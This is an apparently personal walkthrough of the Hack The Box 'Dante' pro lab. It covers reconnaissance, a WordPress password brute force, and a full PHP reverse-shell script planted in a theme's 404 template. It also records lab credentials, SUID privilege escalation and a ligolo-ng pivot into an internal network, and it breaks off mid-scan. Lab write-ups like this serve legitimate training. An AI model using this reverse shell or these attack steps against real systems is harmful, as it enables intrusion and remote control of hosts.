# Dante

**Platform: HacktheBox Pro Labs**

**OS: Linux/Windows**


## Key Learnings



## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Do a ping sweep of the external network to discover alive hosts

```
$ nmap -sn -T5 --min-rate=1000 -oN external_ping_scan 10.10.110.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:35 CST
Nmap scan report for 10.10.110.2
Host is up (0.066s latency).
Nmap scan report for 10.10.110.100
Host is up (0.067s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.47 seconds
```

Discovered 2 hosts on the 10.10.110/24 network: .2 and .100

2. Do a full service scan of all ports for the 2 alive hosts

```
$ nmap -sC -sV -T5 --min-rate=1000 -p- -Pn -oN external_service_scan -iL external_hosts 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-13 16:38 CST
Nmap scan report for 10.10.110.2
Host is up.
All 65535 scanned ports on 10.10.110.2 are in ignored states.
Not shown: 65535 filtered tcp ports (no-response)

Nmap scan report for 10.10.110.100
Host is up (0.066s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 126.36 seconds
```
The nmap output shows 1 host that has open ports, 10.10.110.100, which has 2 open ports of interest, FTP on 21 and HTTP on 65000. 

3. We first test FTP. We try to login anonymously, which is successful. We then proceed to enumerate and exfiltrate any files we can get our hands on. We come across a `todo.txt` file that we download to our local machine.

```
$ ftp 10.10.110.100 
Connected to 10.10.110.100.
220 (vsFTPd 3.0.3)
Name (10.10.110.100:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||12604|)
ftp: Can't connect to `10.10.110.100:12604': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    4 0        0            4096 Apr 14  2021 Transfer
226 Directory send OK.
ftp> cd Transfer
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Apr 14  2021 Incoming
drwxr-xr-x    2 0        0            4096 Aug 04  2020 Outgoing
226 Directory send OK.
ftp> cd Incoming
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             310 Aug 04  2020 todo.txt
226 Directory send OK.
ftp> get todo.txt
local: todo.txt remote: todo.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for todo.txt (310 bytes).
100% |*************************************************************************************************|   310       31.28 KiB/s    00:00 ETA
226 Transfer complete.
310 bytes received in 00:00 (3.95 KiB/s)
ftp> cd ../Outgoing
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> exit
221 Goodbye.
```

4. Before moving on to test port 65000, lets read the contents of the `todo.txt`

```
$ cat todo.txt 
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

5. The nmap scan for port 65000 output tells us about a `/wordpress` directory, and the contents of this file indicate that we are likely dealing with a Wordpress site. 

6. We browse to the URL `http://10.10.110.100:65000/wordpress` and confirm our findings.

<img width="1400" height="1188" alt="image" src="https://github.com/user-attachments/assets/e40b9e96-063f-41cd-ab63-5ee4eae61cc7" />

7. Since we are dealing with a Wordpress website, we run a wpscan on it and enumerate all plugins and users

`wpscan --url http://10.10.110.100:65000/wordpress -e ap,u`

This command gives us the following output:

```
$ wpscan --url http://10.10.110.100:65000/wordpress -e ap 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Sat Dec 13 16:48:34 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 13 16:48:40 2025
[+] Requests Done: 33
[+] Cached Requests: 6
[+] Data Sent: 8.986 KB
[+] Data Received: 342.526 KB
[+] Memory used: 274.148 MB
[+] Elapsed time: 00:00:05
```

8. The wpscan didn't find any plugins but it did find user `james`, so we will do a bruteforce attack to get his password. However, before we do, we will create a custom wordlist of passwords using Hashcat rules

```
$ cat custom.rules                          

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

$ hashcat --force /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -r custom.rules --stdout | sort -u > custom_passwords.wordlist
```

9. Now run password bruteforce attack with custom password list
```
$ wpscan --url http://10.10.110.100:65000/wordpress -U james -P custom_passwords.wordlist -t 50
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]
[+] Started: Sat Dec 13 20:22:15 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <===============================================================> (137 / 137) 100.00% Time: 00:00:04

[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[+] Performing password attack on Wp Login against 1 user/s
Trying james / Pic Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 00:05:37s Time: 00:12:10 <======   > (49261 / 71979) 68.43%  ETA: 0[SUCCESS] - james / Toyota                                                                                                                    
Trying james / Toyota Time: 00:16:19 <==============================                                  > (65850 / 137829) 47.77%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: james, Password: Toyota

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Dec 13 20:38:52 2025
[+] Requests Done: 65989
[+] Cached Requests: 42
[+] Data Sent: 35.523 MB
[+] Data Received: 370.91 MB
[+] Memory used: 285.234 MB
[+] Elapsed time: 00:16:37
```

10. Login using credentials `james:Toyota` and we find we can use the `Theme Editor` feature.

<img width="983" height="873" alt="image" src="https://github.com/user-attachments/assets/2ebf0021-1a04-45a4-b3a2-31f4356a9a31" />

11. On the top right corner, we select the theme `Twenty Seventeen`, click `Select` and edit the `404 Template`. The contents will be modified to the following:

```
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '[ATTACKER_IP]';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?>
```

12. After updating the file, we will start a netcat listener on port 4444

`nc -lvnp 4444`

13. Then run the 404 template using cURL

`curl http://10.10.110.100:65000/wordpress/wp-content/themes/twentyseventeen/404.php`

And we get the reverse shell!

<img width="938" height="199" alt="image" src="https://github.com/user-attachments/assets/5fe44af7-0c8a-48a5-acf2-d99daa059ab9" />

14. After looking at the `/home` directory, we notice the user `james` is on this machine as well. We check if he reused his Wordpress password for his local account as well using `su`

```
www-data@DANTE-WEB-NIX01:/home/james$ su james
su james                                                                                                                                                    
Password: Toyota                                                                                                                                            
                                                                                                                                                            
james@DANTE-WEB-NIX01:~$ ls                                                                                                                                 
ls                                                                                                                                                          
Desktop    Downloads  Music     Public     Videos                                                                                                           
Documents  flag.txt   Pictures  Templates                                                                                                                   
james@DANTE-WEB-NIX01:~$ cat flag.txt                                                                                                                       
cat flag.txt                                                                                                                                                
DANTE{j4m3s_xxxxxxxxxxxxxxxxxxxx!}
```

We login as james successfully and even get a flag!

15. Now let's do some basic privesc enumeration by transferring over the `linpeas.sh` script. We start a python server on our local machine and use wget to download the script onto WEB-NIX01.

`wget http://[IP]/linpeas.sh`

<img width="621" height="210" alt="image" src="https://github.com/user-attachments/assets/5768eecd-e44e-47de-b12d-82de14a0574b" />

16. We give our user execute permissions over it and run the script.

`chmod u+x linpeas.sh; ./linpeas.sh`

<img width="904" height="253" alt="image" src="https://github.com/user-attachments/assets/8c8543ec-06ba-4c50-8c17-b274605b1b78" />

17. We find the credentials `balthazar:TheJoker12345!`. We switch users to it

<img width="360" height="149" alt="image" src="https://github.com/user-attachments/assets/6b7d8b83-df77-4985-a385-6614b6e89a62" />

18. Let's try running `linpeas.sh` again and see if there are any ways to privesc to root.

<img width="824" height="351" alt="image" src="https://github.com/user-attachments/assets/48dfe571-71c0-419b-ad17-e27371c2028c" />

19. In the output, we discover the `find` command has the SUID bit set and find a way to privesc to root on [GTFOBins](https://gtfobins.github.io/gtfobins/find/)

<img width="840" height="284" alt="image" src="https://github.com/user-attachments/assets/9850b19d-de31-4fb0-aa8d-15435be9d7e5" />

20. We got a root shell and the root flag on WEB-NIX01

<img width="554" height="153" alt="image" src="https://github.com/user-attachments/assets/e34d821c-bc7b-41e2-8084-c229688fd01e" />

21. Doing some network enumeration, we discover the 172.16.1.0/24 internal network

`ip a`

<img width="765" height="217" alt="image" src="https://github.com/user-attachments/assets/020fbeb0-4c79-43b0-b8ae-a031dfc5e80c" />

22. Let's pivot into this internal network using ligolo-ng. This will be done with the following steps:

22.1 Transfer the Linux version of ligolo-ng agent to WEB-NIX01

On local machine, start web server
`python3 -m http.server 80`

On WEB-NIX01, use wget to transfer script over
`wget http://10.10.14.12/lin-agent`

<img width="1229" height="184" alt="image" src="https://github.com/user-attachments/assets/8d267432-7025-4558-9f46-3d65d886cd2d" />

22.2 On local machine, setup interface for internal network

```
$ sudo ip tuntap add user [USERNAME] mode tun ligolo1
[sudo] password for joseph12: 
                                                                                                                                                            
┌──(joseph12㉿kali)-[~/transfer/ligolo-ng]
└─$ sudo ip link set ligolo1 up                      
                                                                                                                                                            
┌──(joseph12㉿kali)-[~/transfer/ligolo-ng]
└─$ sudo ip route add 172.16.1.0/24 dev ligolo1
```

22.3 On local machine, start ligolo-ng proxy

`./lin-proxy -selfcert -laddr 0.0.0.0:1234`

22.4 On WEB-NIX01, run lin-agent and connect back to proxy

`./lin-agent -ignore-cert -connect [LOCAL_IP]:1234`

<img width="660" height="85" alt="image" src="https://github.com/user-attachments/assets/bdaadfe6-1cae-439f-9f98-2973b54e885d" />

22.5 On local machine, choose session 1 and start ligolo1 tunnel

`tunnel_start --tun ligolo1`

<img width="1265" height="376" alt="image" src="https://github.com/user-attachments/assets/e4079181-e6be-422d-910f-344b0a9fc57e" />

23. Now, we will enumerate which hosts are on the internal network by doing a ping sweep from the WEB-NIX01 root shell

```
root@DANTE-WEB-NIX01:~# for i in $(seq 254); do ping 172.16.1.$i -c1 -W1 & done | grep from
64 bytes from 172.16.1.5: icmp_seq=1 ttl=128 time=3.13 ms
64 bytes from 172.16.1.13: icmp_seq=1 ttl=128 time=2.39 ms
64 bytes from 172.16.1.12: icmp_seq=1 ttl=64 time=1.60 ms
64 bytes from 172.16.1.20: icmp_seq=1 ttl=128 time=0.604 ms
64 bytes from 172.16.1.10: icmp_seq=1 ttl=64 time=0.442 ms
64 bytes from 172.16.1.17: icmp_seq=1 ttl=64 time=0.515 ms
64 bytes from 172.16.1.19: icmp_seq=1 ttl=64 time=1.68 ms
64 bytes from 172.16.1.102: icmp_seq=1 ttl=128 time=0.633 ms
64 bytes from 172.16.1.100: icmp_seq=1 ttl=64 time=0.016 ms
64 bytes from 172.16.1.101: icmp_seq=1 ttl=128 time=0.990 ms
```

We get back 9 additional hosts (excluding WEB-NIX01, 172.16.1.100)

24. We'll do a full service scan of all the hosts in the internal network

`nmap -sC -sV -T5 --min-rate=1200 -Pn -p- -oN internal_service_scan -iL 172.16.1.0_alive_hosts.txt`

```
Nmap scan report for 172.16.1.5
Host is up (0.088s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          FileZilla ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
111/tcp   open  rpcbind      2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Instance name: SQLEXPRESS
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2025-12-17T19:09:01+00:00; -33s from scanner time.
| ms-sql-ntlm-info: 
|   172.16.1.5\SQLEXPRESS: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-17T09:08:30
|_Not valid after:  2055-12-17T09:08:30
2049/tcp  open  nlockmgr     1-4 (RPC #100021)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49673/tcp open  ms-sql-s     Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-17T09:08:30
|_Not valid after:  2055-12-17T09:08:30
| ms-sql-info: 
|   172.16.1.5:49673: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 49673
| ms-sql-ntlm-info: 
|   172.16.1.5:49673: 
|     Target_Name: DANTE-SQL01
|     NetBIOS_Domain_Name: DANTE-SQL01
|     NetBIOS_Computer_Name: DANTE-SQL01
|     DNS_Domain_Name: DANTE-SQL01
|     DNS_Computer_Name: DANTE-SQL01
|_    Product_Version: 10.0.14393
|_ssl-date: 2025-12-17T19:09:02+00:00; -33s from scanner time.
49678/tcp open  msrpc        Microsoft Windows RPC
49679/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DANTE-SQL01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:2d:b5 (VMware)
| smb2-time: 
|   date: 2025-12-17T19:08:15
|_  start_date: 2025-12-17T09:08:23
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -33s, deviation: 0s, median: -34s

Nmap scan report for 172.16.1.10
Host is up (0.069s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:9c:1b:a5:c1:7f:2d:4f:4b:e8:cc:7b:e4:47:bc:a9 (RSA)
|   256 fd:d6:3a:3f:a8:04:56:4c:e2:76:db:85:91:0c:5e:42 (ECDSA)
|_  256 e2:d5:17:7c:58:75:26:5b:e1:1b:98:39:3b:2c:6c:fc (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dante Hosting
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-12-17T19:08:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-NIX02, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Nmap scan report for 172.16.1.12
Host is up (0.069s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 22:cc:a3:e8:7d:d5:65:6d:9d:ea:17:d1:d9:1b:32:cb (RSA)
